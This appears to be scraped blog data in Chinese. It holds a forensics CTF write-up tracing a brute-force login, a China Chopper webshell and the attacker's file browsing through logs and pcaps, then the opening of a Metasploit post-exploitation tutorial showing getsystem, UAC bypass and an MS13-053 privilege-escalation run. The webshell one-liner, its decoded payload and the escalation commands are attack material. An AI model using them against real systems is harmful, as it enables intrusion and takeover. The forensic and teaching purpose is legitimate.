解压密码：t3sectimu题目要求:背景提示：黑客对一个网站管理系统进行了暴力破解，成功获取了管理权限，并下载了重要文件。问题： （1）黑客最终获得了什么用户名（2）黑客最终获得了什么密码（3）黑客修改了什么文件（4）黑客使用菜刀的完整连接地址（5）黑客使用菜刀的连接密码(6)黑客的查看的第一个文件目录是什么 0x01 初步分析攻击者IP我们在假定攻击者攻击成功的情况下，应该会留下网页木马，先看下最后一个被访问的那些链接，这里通过Web Log Explorer的Exit Point查看这里看到三个比较可疑的 123tunnel.phpbackdoor.phpy0n.php 然后看三个中最早的具体保文，可以看到 1172.16.61.210 (LOCAL NETWORK) 2016/8/10 1:16:07 /y0n.php 200 - OK No Referrer 1172.16.61.210 (LOCAL NETWORK) 2016/8/10 1:15:38 /backdoor.php 200 - OK No Referrer 1101.36.79.67 (Beijing,Beijing,China) 2016/8/10 1:03:07 /tunnel.php 28 200 - OK No Referrer 这里面的/tunnel.php，如果我们做过内网渗透的时候应该都知道，这个是一个HTTP代理，我们又注意到backdoor.php和y0n.php的访问IP都是内网，再看下访问时间，可以推出攻击者是通过tunnul代理进来的。攻击者IP大致可以确定是101.36.79.67。现在已经的最早攻击成功时间是2016/8/10 1:03:07.这个情况下分析下101.36.79.67这个IP的访问记录。我们通过Apache Logs Viewer来过滤IP。分析攻击过程这里面没发现有啥能getshell的操作。这条思路断了。 0x02 再分析攻击者IP接下来通过单个页面的点击情况来分析(正常首页那种情况访问量应该多，，后台的访问应该比较少)然后这里陷入一个惯性思维，，以为index.php一定是首页。点进去才看到index.php?m=admin&amp;c=index&amp;a=login&amp;pc_hash=xFbuB1这样的链接，想起来这是用MVC书写的时候的链接上次。点进index.php这里发现大量对后台进行访问，，初步推测可能在爆破账号密码。对IP进行过滤，排除掉内网IP，得到219.239.105.18这个IP 0x03 分析攻击过程我们通过Apache Logs Viewer来过滤IP我们分析该IP大约从2016/8/9 22:17分开始进行爆破(后台，发送大量POST包可以推断出来)，然后我们往后看大约在 2016/8/9 23:02 爆破成功接下来我们看到这里使用模板的editFile,修改的search 的index.html。然后后面通过POST访问search这个，模块，，初步推测，，这里是种马和访问马的过程。这里单纯看日志有个不好的地方，，就是看不到POST的body里面的内容，这个时候就得结合流量包。 0x04 分析攻击流量我们通过流量包来验证上面日志的分析 分析爆破出来的账号密码如果直接用wireshark一个个打开，太大了。这里推荐个软件 httppcap 专门用来提取http数据包的。总共有8个流量包，，如果一个个分析的话太繁琐，我们先大约估计爆破的在哪几个包里面。通过一下shell脚本，提取每个包里面来自219.239.105.18的http请求头部1234for file in `ls`do parse-pcap -i 219.239.105.18 $file &gt;&gt; txt/$file.txtdone 然后匹配哪些包里面含有m=index这样的请求123456for file in `ls`do echo $file cat $file|grep &apos;/index.php?m=admin&apos; echo &quot;-----------------------------------------------------&quot;done 得到爆破的流量都在数据采集D_eth0_NS_20160810_130801.pcap这个文件里面接下来使用1parse-pcap -i 219.239.105.18 -vvv 数据采集D_eth0_NS_20160810_130801.pcap &gt; txt/all.txt 来查看所有的爆破时候的http具体报文如图,爆破的数据包在里面，，接下来寻找爆破成功的那个根据发包时间和回包大小我们确实了登录成功的账号为root，密码为123456。 0x02 分析一句话通过上面方法匹配m=search,得到报文在数据采集D_eth0_NS_20160810_141903.pcap,数据采集D_eth0_NS_20160810_142037.pcap,数据采集D_eth0_NS_20160810_142224.pcap里面然后提取报文详情熟悉的一句话,urldecode一下 1chopper=@eval\u0001(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw== 密码为chooper 第一个目录是/var/www/html 0x03 一句话操作分析总共有15个一句话操作第一个解码完就是 12345678910111213141516&lt;?php@ini_set(\"display_errors\", \"0\");@set_time_limit(0);@set_magic_quotes_runtime(0);echo(\"-&gt;|\");$D = dirname($_SERVER[\"SCRIPT_FILENAME\"]);if ($D == \"\") $D = dirname($_SERVER[\"PATH_TRANSLATED\"]);$R = \"&#123;$D&#125;\\t\";if (substr($D, 0, 1) != \"/\") &#123; foreach (range(\"A\", \"Z\") as $L) if (is_dir(\"&#123;$L&#125;:\")) $R .= \"&#123;$L&#125;:\";&#125;$R .= \"\\t\";$u = (function_exists('posix_getegid')) ? @posix_getpwuid(@posix_geteuid()) : '';$usr = ($u) ? $u['name'] : @get_current_user();$R .= php_uname();$R .= \"(&#123;$usr&#125;)\";print $R;;echo(\"|&lt;-\");die();?&gt; 这个脚本的作用是获取网页所在的绝对路径接下来依次分析，分别是查看 /var/www/html 目录底下的文件内容有这些 123456789101112131415161718caches/ 2016-08-04 10:40:44 4096 0777uploadfile/ 2016-08-04 11:01:20 4096 0777statics/ 2016-08-04 10:38:16 4096 0777api/ 2016-08-04 10:38:16 4096 0777../ 2016-08-04 10:37:16 4096 0755phpsso_server/ 2016-08-04 10:38:16 4096 0777html/ 2016-08-04 10:46:37 4096 0777./ 2016-08-04 10:39:54 4096 0777phpcms/ 2016-08-04 10:38:16 4096 0777plugin.php 2016-08-04 10:38:16 3573 0777index.html 2016-08-04 11:55:19 17588 0777crossdomain.xml 2016-08-04 10:38:16 104 0777robots.txt 2016-08-04 10:38:16 170 0777admin.php 2016-08-04 10:38:16 48 0777api.php 2016-08-04 10:38:16 595 0777index.php 2016-08-04 10:38:16 318 0777js.html 2016-08-04 10:38:16 523 0777favicon.ico 2016-08-04 10:38:16 3158 0777 接下来查看的是根目录底下的文件夹,有 123456789101112131415161718192021222324var/ 2016-07-22 19:50:16 4096 0755selinux/ 2016-07-16 00:59:51 0 0755lib/ 2016-07-11 23:51:40 4096 0555dev/ 2016-07-16 01:01:30 3740 0755media/ 2016-07-12 00:18:35 4096 0755usr/ 2016-07-11 23:46:08 4096 0755tmp/ 2016-08-09 18:16:02 4096 1777etc/ 2016-08-09 18:16:11 12288 0755proc/ 2016-07-16 00:59:50 0 0555bin/ 2016-07-16 02:18:03 4096 0555../ 2016-07-16 01:00:10 4096 0555home/ 2016-08-04 10:23:14 4096 0755srv/ 2011-09-23 19:50:20 4096 0755opt/ 2016-07-12 00:03:18 4096 0755sbin/ 2016-07-16 02:18:04 12288 0555data1/ 2016-07-12 00:11:00 4096 0755./ 2016-07-16 01:00:10 4096 0555mnt/ 2016-07-12 00:01:13 4096 0755sys/ 2016-07-16 00:59:50 0 0755lib64/ 2016-07-16 02:17:51 12288 0555boot 1970-01-01 08:00:00 0root 1970-01-01 08:00:00 0.autofsck 2016-07-16 01:00:10 0 0644lost+found 1970-01-01 08:00:00 0 接下来查看/etc/底下的文件夹123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228./ 2016-08-09 18:16:11 12288 0755../ 2016-07-16 01:00:10 4096 0555rc4.d/ 2016-08-01 11:01:41 4096 0755pulse/ 2016-07-12 00:01:49 4096 0755skel/ 2016-07-11 23:50:01 4096 0755bash_completion.d/ 2016-07-11 23:55:24 4096 0755samba/ 2016-07-11 23:51:59 4096 0755pango/ 2016-07-11 23:49:07 4096 0755cron.hourly/ 2016-07-11 23:51:58 4096 0755foomatic/ 2016-07-11 23:53:35 4096 0755rwtab.d/ 2013-11-23 05:20:24 4096 0755chkconfig.d/ 2013-09-23 17:07:36 4096 0755obex-data-server/ 2016-07-11 23:49:42 4096 0755wpa_supplicant/ 2016-07-11 23:48:32 4096 0755vmware-tools/ 2016-07-12 00:03:14 4096 0755logrotate.d/ 2016-07-16 02:41:56 4096 0755gnome-vfs-2.0/ 2016-07-11 23:48:27 4096 0755terminfo/ 2010-08-18 23:41:41 4096 0755xdg/ 2016-07-11 23:50:13 4096 0755alternatives/ 2016-07-11 23:52:04 4096 0755hal/ 2016-07-11 23:50:59 4096 0755setuptool.d/ 2016-07-11 23:51:14 4096 0755init.d/ 2016-08-01 11:01:39 4096 0755cups/ 2016-07-11 23:54:38 4096 0755makedev.d/ 2016-07-11 23:47:34 4096 0755ntp/ 2016-07-11 23:51:44 4096 0755abrt/ 2016-07-11 23:48:54 4096 0755pm/ 2016-07-11 23:46:08 4096 0755rc.d/ 2016-07-12 00:03:18 4096 0755httpd/ 2016-07-16 02:12:59 4096 0755gdm/ 2016-07-11 23:51:13 4096 0755gtk-2.0/ 2016-07-11 :50:01 4096 0755ssl/ 2016-07-11 23:47:27 4096 0755libreport/ 2016-07-11 23:48:53 4096 0755gcrypt/ 2013-10-24 23:38:14 4096 0755sound/ 2016-07-11 23:50:01 4096 0755rc1.d/ 2016-08-01 11:01:41 4096 0755yum.repos.d/ 2016-07-11 23:50:16 4096 0755default/ 2016-07-11 23:46:45 4096 0755dracut.conf.d/ 2016-07-12 00:01:52 4096 0755rpm/ 2016-07-16 02:33:57 4096 0755php.d/ 2016-07-16 02:33:56 4096 0755avahi/ 2016-07-11 23:48:23 4096 0755openldap/ 2016-07-11 23:58:43 4096 0755sudoers.d/ 2013-11-22 20:51:12 4096 0750festival/ 2016-07-11 23:50:10 4096 0755kdump-adv-conf/ 2016-07-11 23:54:24 4096 0755rsyslog.d/ 2013-11-22 23:15:59 4096 0755depmod.d/ 2016-07-11 23:48:04 4096 0755PackageKit/ 2016-07-11 23:50:14 4096 0755snmp/ 2016-08-01 11:03:14 4096 0755profile.d/ 2016-07-11 23:54:40 4096 0755dnsmasq.d/ 2013-02-22 12:40:04 4096 0755pam.d/ 2016-07-12 00:00:58 4096 0755rc6.d/ 2016-08-01 11:01:41 4096 0755sgml/ 2016-07-11 23:48:11 4096 0755plymouth/ 2016-07-11 23:50:30 4096 0755cron.weekly/ 2011-09-27 09:33:08 4096 0755sane.d/ 2016-07-11 23:51:40 4096 0755pear/ 2016-05-11 06:42:17 4096 0755ppp/ 2016-07-11 23:50:19 4096 0755event.d/ 2016-07-11 23:48:06 4096 0755popt.d/ 2010-08-21 13:30:56 4096 0755pcmcia/ 2016-07-11 23:52:27 4096 0755rc0.d/ 2016-08-01 11:01:41 4096 0755sysconfig/ 2016-08-01 11:01:39 4096 0755lvm/ 2016-07-11 23:54:01 4096 0755bonobo-activation/ 2016-07-11 23:47:18 4096 0755audisp/ 2016-07-113:54:43 4096 0750opt/ 2011-09-23 19:50:20 4096 0755polkit-1/ 2016-07-11 23:48:05 4096 0755prelink.conf.d/ 2016-07-12 00:00:53 4096 0755gnupg/ 2013-10-24 23:38:54 4096 0755ghostscript/ 2016-07-11 23:49:01 4096 0755ld.so.conf.d/ 2016-07-16 01:49:50 4096 0755rc2.d/ 2016-08-01 11:01:41 4096 0755iproute2/ 2016-07-11 23:50:18 4096 0755udev/ 2016-07-11 23:50:21 4096 0755init/ 2016-07-11 23:54:28 4096 0755cron.daily/ 2016-07-11 23:55:23 4096 0755acpi/ 2016-07-11 23:54:28 4096 0755rc3.d/ 2016-08-01 11:01:41 4096 0755postfix/ 2016-07-11 23:51:54 4096 0755X11/ 2016-07-11 23:51:00 4096 0755ssh/ 2016-07-12 00:00:35 4096 0755cron.monthly/ 2016-07-11 23:54:28 4096 0755blkid/ 2013-11-22 23:29:33 4096 0755security/ 2016-07-11 23:51:58 4096 0755scl/ 2016-07-11 23:55:24 4096 0755alsa/ 2016-07-11 23:52:26 4096 0755gconf/ 2016-07-11 23:48:20 4096 0755statetab.d/ 2013-11-23 05:20:24 4096 0755pkcs11/ 2016-07-11 23:47:16 4096 0755dbus-1/ 2016-07-11 23:47:00 4096 0755sasl2/ 2016-07-11 23:51:54 4096 0755hp/ 2016-07-11 23:51:40 4096 0755pki/ 2016-07-11 23:51:43 4096 0755fonts/ 2016-07-11 23:47:58 4096 0755ConsoleKit/ 2016-07-11 23:48:06 4096 0755xml/ 2016-07-11 23:46:06 4096 0755dhcp/ 2013-11-22 22:30:00 4096 0750rc5.d/ 2016-08-01 11:01:41 4096 0755xinetd.d/ 2016-07-11 23:55:23 4096 0755vmware-caf/ 2016-07-12 00:00:57 4096 0755yum/ 2016-07-11 23:48:52 4096 0755hosts.deny 2010-01-12 21:28:22 460 0644statetab 20131-23 05:20:24 212 0644networks 2013-11-23 05:20:24 58 0644motd 2010-01-12 21:28:22 0 0644ntp.conf 2013-07-15 17:18:47 1778 0644at.deny 2012-01-30 21:56:34 1 0644inputrc 2010-01-12 21:28:22 942 0644pm-utils-hd-apm-restore.conf 2012-07-18 17:04:08 370 0644.pwd.lock 1970-01-01 08:00:00 0libuser.conf 2016-07-11 23:58:43 2290 0644sudo-ldap.conf 2013-10-07 20:51:58 3181 0640mailcap 2009-11-18 05:13:33 272 0644bluetooth 1970-01-01 08:00:00 0selinux 1970-01-01 08:00:00 0mime.types 2011-09-23 23:02:51 43591 0644rc.sysinit 1970-01-01 08:00:00 0hosts.allow 2010-01-12 21:28:22 370 0644magic 2012-10-04 22:51:04 111 0644my.cnf 2016-05-11 14:31:18 251 0644sysctl.conf 2013-11-23 05:20:24 1150 0644crypttab 2016-07-11 23:45:38 0 0644nanorc 2010-11-12 15:18:32 7846 0644man.config 2013-02-22 10:13:09 4940 0644csh.cshrc 2013-10-02 17:06:18 1602 0644yum.conf 2013-02-22 19:26:34 969 0644securetty 2010-01-12 21:28:22 122 0600bashrc 2013-10-02 17:06:18 2681 0644group 2016-07-16 02:31:22 774 0644libaudit.conf 2012-03-02 02:42:34 191 0640pbm2ppa.conf 2010-08-23 07:28:29 1362 0644gshadow 1970-01-01 08:00:00 0protocols 2010-01-12 21:28:22 6455 0644dnsmasq.conf 2013-02-22 12:40:04 21214 0644hosts 2010-01-12 21:28:22 158 0644shadow 1970-01-01 08:00:00 0passwd- 2016-07-11 23:59:08 1435 0644vimrc 2012-02-17 23:17:03 1962 0644quotatab 2013-11-22 19:32:14 259 0644environment 2013-10-02 17:06:18 0 0644portreserve 10-01-01 08:00:00 0anacrontab 2013-11-23 20:43:13 541 0600issue.net 2013-11-27 19:53:33 46 0644centos-release 2013-11-27 19:53:33 27 0644aliases 1970-01-01 08:00:00 0mtab 2016-07-16 01:08:53 444 0644quotagrpadmins 2008-10-14 01:29:19 220 0644sudo.conf 2012-09-25 23:46:01 1786 0640favicon.png 2007-01-25 05:13:36 918 0644exports 2010-01-12 21:28:22 0 0644sestatus.conf 2013-11-23 06:44:51 216 0644printcap 2010-01-12 21:28:22 233 0644rsyslog.conf 1970-01-01 08:00:00 0gshadow- 1970-01-01 08:00:00 0DIR_COLORS.256color 2013-10-17 20:51:45 5139 0644ld.so.conf 2013-07-25 02:50:25 28 0644DIR_COLORS 2013-10-17 20:51:45 4439 0644rc.local 2016-07-11 23:59:08 220 0755system-release-cpe 2013-11-27 19:53:33 25 0644grub.conf 1970-01-01 08:00:00 0localtime 2016-07-11 23:58:41 2819 0644virc 2012-02-17 23:17:03 1962 0644prelink.conf 2013-07-19 22:35:49 789 0644services 2013-10-02 17:06:18 641020 0644kdump.conf 2016-07-11 23:54:24 7786 0644tpvmlp.conf 2016-07-16 01:01:27 1309 0644host.conf 2013-10-02 17:06:18 9 0644ethers 2012-05-10 16:17:31 28 0644issue 2013-11-27 19:53:33 47 0644pinforc 2010-08-21 09:43:26 2872 0644drirc 2013-11-25 20:52:10 1804 0644pnm2ppa.conf 2010-08-23 07:28:29 6300 0644redhat-release 2013-11-27 19:53:33 27 0644dracut.conf 2013-11-26 18:58:48 519 0644updatedb.conf 1970-01-01 08:00:00 0inittab 2016-07-12 00:03:18 884 0644sudoers 2012-03-02 01:18:24 4002 0440odbc.ini 2014-07-10 16::09 0 0644adjtime 1970-01-01 08:00:00 0csh.login 2013-10-02 17:06:18 794 0644group- 2016-07-11 23:59:08 762 0600pear.conf 2016-05-11 06:42:17 946 0644wgetrc 2012-10-10 17:06:54 4479 0644shadow- 1970-01-01 08:00:00 0fstab 2016-07-12 00:03:17 805 0644audit 1970-01-01 08:00:00 0nsswitch.conf 2010-05-05 03:22:21 1688 0644NetworkManager 1970-01-01 08:00:00 0warnquota.conf 2013-11-22 19:32:22 3008 0644login.defs 2016-07-11 23:58:43 1831 0644mke2fs.conf 2009-09-08 05:02:53 801 0644DIR_COLORS.lightbgcolor 2013-10-17 20:51:45 4113 0644prelink.cache 1970-01-01 08:00:00 0passwd.OLD 2016-07-11 23:59:08 1429 0644mtools.conf 2010-08-17 05:28:51 2620 0644readahead.conf 2013-11-23 21:52:17 966 0644fprintd.conf 2013-11-22 22:35:33 20 0644rwtab 2013-11-23 05:20:24 930 0644mail.rc 2013-08-01 17:12:47 1909 0644shadow.bak 2016-07-28 17:40:52 844 0755smartd.conf 2013-02-22 06:26:22 6717 0644odbcinst.ini 2014-07-10 16:15:09 575 0644gai.conf 2013-11-22 05:24:28 0 0644php.ini 2016-05-11 05:42:18 69097 0644crontab 1970-01-01 08:00:00 0ld.so.cache 2016-08-01 11:01:41 53651 0644system-release 2013-11-27 19:53:33 27 0644aliases.db 1970-01-01 08:00:00 0passwd 2016-07-16 02:31:22 1487 0644top.ini 2016-08-10 14:15:01 0 0644modprobe.d 1970-01-01 08:00:00 0enscript.cfg 2010-11-11 14:44:35 4843 0644rpc 2010-05-04 19:27:23 1615 0644cron.deny 2013-11-23 20:43:13 0 0600cron.d 1970-01-01 08:00:00 0shells 2016-07-113:54:44 61 0644profile 2013-10-02 17:06:18 1796 0644asound.conf 2009-05-15 04:53:38 148 0644logrotate.conf 2007-08-29 15:19:36 662 0644filesystems 2013-10-02 17:06:18 64 0644krb5.conf 2013-08-29 01:33:13 449 0644sos.conf 2013-11-23 03:12:07 260 0644rc 1970-01-01 08:00:00 0resolv.conf 2016-07-25 11:57:19 49 0644 接下来查看/etc/shadow这个文件，但是没看到，估计是因为权限不够接下来查看/etc/passwd-获得 12345678910111213141516171819202122232425262728293031|root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinusbmuxd:x:113:113:usbmuxd user:/:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinrtkit:x:499:497:RealtimeKit:/proc:/sbin/nologinavahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologinabrt:x:173:173::/etc/abrt:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologingdm:x:42:42::/var/lib/gdm:/sbin/nologinntp:x:38:38::/etc/ntp:/sbin/nologinapache:x:48:48:Apache:/var/www:/sbin/nologinsaslauth:x:498:76:&quot;Saslauthd user&quot;:/var/empty/saslauth:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinpulse:x:497:496:PulseAudio Syst Daemon:/var/run/pulse:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologintcpdump:x:72:72::/:/sbin/nologinsimple:x:500:500:Simple:/home/simple:/bin/bash 接下来/home里面没看到东西。接下来查看/opt/底下得到 123../ 2016-07-16 01:00:10 4096 0555./ 2016-07-12 00:03:18 4096 0755rh/ 2013-11-22 18:16:37 4096 0755 接下来又傻逼的查看/home里面没看到东西。接下来查看/var/里面得到 1234567891011121314151617181920212223db/ 2016-07-11 23:54:42 4096 0755lib/ 2016-07-16 02:31:24 4096 0755lock/ 2016-08-09 18:16:02 4096 0775tmp/ 2016-08-08 09:46:00 4096 1777spool/ 2016-07-11 23:54:43 4096 0755run/ 2016-08-10 00:35:03 4096 0755cache/ 2016-07-16 02:33:57 4096 0755crash/ 2013-11-23 09:15:37 4096 0755gdm/ 2013-11-22 23:54:18 4096 1770preserve/ 2011-09-23 19:50:20 4096 0755account/ 2016-07-11 23:54:44 4096 0755www/ 2016-08-04 10:37:16 4096 0755empty/ 2016-07-11 23:54:25 4096 0755log/ 2016-08-07 18:36:03 4096 0755nis/ 2011-09-23 19:50:20 4096 0755local/ 2011-09-23 19:50:20 4096 0755../ 2016-07-16 01:00:10 4096 0555opt/ 2011-09-23 19:50:20 4096 0755./ 2016-07-22 19:50:16 4096 0755yp 1970-01-01 08:00:00 0abc 1970-01-01 08:00:00 0games 1970-01-01 08:00:00 0mail 1970-01-01 08:00:00 0 接下来查看/var/log/得到 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768ntpstats/ 2013-11-24 02:21:54 4096 0755samba/ 2016-07-11 23:52:01 4096 0700cups/ 2013-08-17 18:21:22 4096 0755httpd/ 2016-08-07 18:36:02 4096 0700gdm/ 2016-07-16 01:01:33 4096 1770sa/ 2016-08-09 15:00:01 4096 0755../ 2016-07-22 19:50:16 4096 0755ppp/ 2010-08-23 07:22:22 4096 0700./ 2016-08-07 18:36:03 4096 0755prelink/ 2016-07-16 02:16:57 4096 0755ConsoleKit/ 2016-07-12 00:03:21 4096 0755vmware-caf/ 2016-07-12 00:01:49 4096 0755secure 2016-08-10 14:10:25 997 0600maillog-20160724 2016-07-22 19:34:03 3589 0600yum.log 2016-08-01 14:59:17 1907 0600anaconda.program.log 2016-07-11 23:59:08 31242 0600pm-powersave.log 2016-07-16 01:01:34 89 0644cron 2016-08-10 14:18:01 360975 0600cron-20160724 2016-07-25 12:43:01 101645 0600wtmp 2016-08-10 14:10:25 51072 0664messages-20160724 2016-07-25 11:57:19 21952 0600Xorg.0.log.old 2016-07-12 00:15:52 50682 0644wpa_supplicant.log 2016-07-12 00:00:29 0 0644anaconda.syslog 2016-07-11 23:59:08 148754 0600anaconda.ifcfg.log 2016-07-11 23:59:08 2657 0600anaconda.storage.log 2016-07-11 23:59:08 109194 0600Xorg.1.log 2016-07-12 00:14:50 50448 0644cron-20160807 2016-08-07 18:36:03 606821 0600spooler-20160807 2016-07-31 18:37:02 0 0600Xorg.0.log 2016-08-09 14:01:46 83699 0644btm2016-08-10 14:06:03 9600 0600anaconda.xlog 2016-07-11 23:59:08 35088 0600boot.log 2016-07-16 01:01:29 2959 0644secure-20160807 2016-08-05 20:01:06 27030 0600messages-20160717 2016-07-16 02:41:58 285781 0600spooler 2016-08-07 18:36:03 0 0600vmware-vmsvc.log 2016-07-25 11:29:49 4779 0644tallylog 2016-07-11 23:47:58 0 0600spice-vdagent.log 2016-07-12 00:00:17 0 0600vmware-vmusr.log 2016-08-03 11:04:06 10063 0644mysqld.log.rpmsave 2016-07-16 02:41:39 1672 0640maillog 2016-08-09 18:16:11 1795 0600dmesg.old 2016-07-11 23:59:43 89000 0644maillog-20160731 2016-07-30 18:32:35 4173 0600spooler-20160717 2016-07-11 23:51:44 0 0600cron-20160717 2016-07-17 18:16:01 35440 0600maillog-20160807 2016-08-06 18:16:04 4195 0600maillog-20160717 2016-07-16 18:22:11 1590 0600spooler-20160724 2016-07-17 18:16:01 0 0600spooler-20160731 2016-07-25 12:43:02 0 0600vmware-tools-upgrader.log 2016-07-12 00:03:18 363533 0644audit 1970-01-01 08:00:00 0anaconda.log 2016-07-11 23:59:08 20411 0600messages-20160731 2016-07-28 10:27:06 1884 0600secure-20160724 2016-07-23 00:21:37 1654 0600lastlog 2016-08-10 14:06:12 146292 0644btmp-20160801 2016-08-01 11:33:21 14976 0600anaconda.yum.log 2016-07-11 23:59:08 99366 0600dmesg 2016-07-16 01:00:10 90056 0644Xorg.2.log 2016-07-12 00:15:24 38224 0644mysqld.log 2016-07-16 02:43:47 1367 0640vmware-install.log 2016-07-12 00:03:18 5359 0644secure-20160717 2016-07-16 03:13:18 7399 0600secur20160731 2016-07-29 17:36:01 8445 0600messages-20160807 2016-08-07 06:04:01 34355 0600cron-20160731 2016-07-31 18:37:01 120163 0600messages 2016-08-10 02:42:01 468 0600dracut.log 2016-07-12 00:03:09 345367 0644 接下来想删除掉/var/log/yum.log，看样子失败了接下来查看/var/empty/,得到 123sshd/ 2013-11-23 06:40:03 4096 0711../ 2016-07-22 19:50:16 4096 0755./ 2016-07-11 23:54:25 4096 0755 接下来，读取/var/log/yum.log的内容，，失败好吧，，又想删除/var/log/yum.log,还是失败","categories":[{"name":"取证","slug":"取证","permalink":"http://www.daikersec.com/categories/取证/"},{"name":"流量分析","slug":"取证/流量分析","permalink":"http://www.daikersec.com/categories/取证/流量分析/"}],"tags":[{"name":"wireshark","slug":"wireshark","permalink":"http://www.daikersec.com/tags/wireshark/"},{"name":"数据分析","slug":"数据分析","permalink":"http://www.daikersec.com/tags/数据分析/"},{"name":"取证","slug":"取证","permalink":"http://www.daikersec.com/tags/取证/"},{"name":"日志分析","slug":"日志分析","permalink":"http://www.daikersec.com/tags/日志分析/"},{"name":"流量分析","slug":"流量分析","permalink":"http://www.daikersec.com/tags/流量分析/"}]},{"title":"metasploit在后渗透中的作用","slug":"metasploit在后渗透中的作用","date":"2018-03-19T05:23:50.000Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"wiki/9668f403.html","link":"","permalink":"http://www.daikersec.com/wiki/9668f403.html","excerpt":"0x00 前言这里简要探究下meterpreter 的使用。meterpreter有个很有效的功能就是，除了持久化控制,其他的操作都在内存里面，不会写进物理磁盘。重启下各种痕迹就消失了。 0x01 权限提升","text":"0x00 前言这里简要探究下meterpreter 的使用。meterpreter有个很有效的功能就是，除了持久化控制,其他的操作都在内存里面，不会写进物理磁盘。重启下各种痕迹就消失了。 0x01 权限提升 getsystem 123456meterpreter &gt; getuidServer username: TEST\\Administratormeterpreter &gt; getsystem...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).meterpreter &gt; getuidServer username: NT AUTHORITY\\SYSTEM bypassuac 12345678meterpreter &gt; background [*] Backgrounding session 1...msf exploit(multi/handler) &gt; use exploit/windows/local/bypassuacmsf exploit(windows/local/bypassuac) &gt; set session 1session =&gt; 1msf exploit(windows/local/bypassuac) &gt; exploit[*] Started reverse TCP handler on 192.168.161.138:4444 利用windows提权漏洞进行提升 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061 meterpreter &gt; background [*] Backgrounding session 1...msf exploit(windows/local/bypassuac_vbs) &gt; use post/windows/gather/enum_patches msf post(windows/gather/enum_patches) &gt; set session 1session =&gt; 1msf post(windows/gather/enum_patches) &gt; exploit[+] KB2871997 is missing[+] KB2928120 is missing[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2[*] KB2778930 applied[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1[*] Post module execution completedmsf post(windows/gather/enum_patches) &gt; search MS13-053Matching Modules================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- exploit/windows/local/ms13_053_schlamperei 2013-12-01 average Windows NTUserMessageCall Win32k Kernel Pool Overflow (Schlamperei) exploit/windows/local/ppr_flatten_rec 2013-05-15 average Windows EPATHOBJ::pprFlattenRec Local Privilege Escalationmsf post(windows/gather/enum_patches) &gt; use exploit/windows/local/ms13_053_schlampereimsf exploit(windows/local/ms13_053_schlamperei) &gt; show optionsModule options (exploit/windows/local/ms13_053_schlamperei): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on.Exploit target: Id Name -- ---- 0 Windows 7 SP0/SP1msf exploit(windows/local/ms13_053_schlamperei) &gt; msf exploit(windows/local/ms13_053_schlamperei) &gt; set session 1session =&gt; 1msf exploit(windows/local/ms13_053_schlamperei) &gt; exploit[*] Started reverse TCP handler on 192.168.161.138:4444 [*] Launching notepad to host the exploit...[+] Process 2980 launched.[*] Reflectively injecting the exploit DLL into 2980...[*] Injecting exploit into 2980...[*] Found winlogon.exe with PID 432[+] Everything seems to have worked, cross your fingers and wait for a SYSTEM shell[*] Sending stage (179779 bytes) to 192.168.161.132[*] 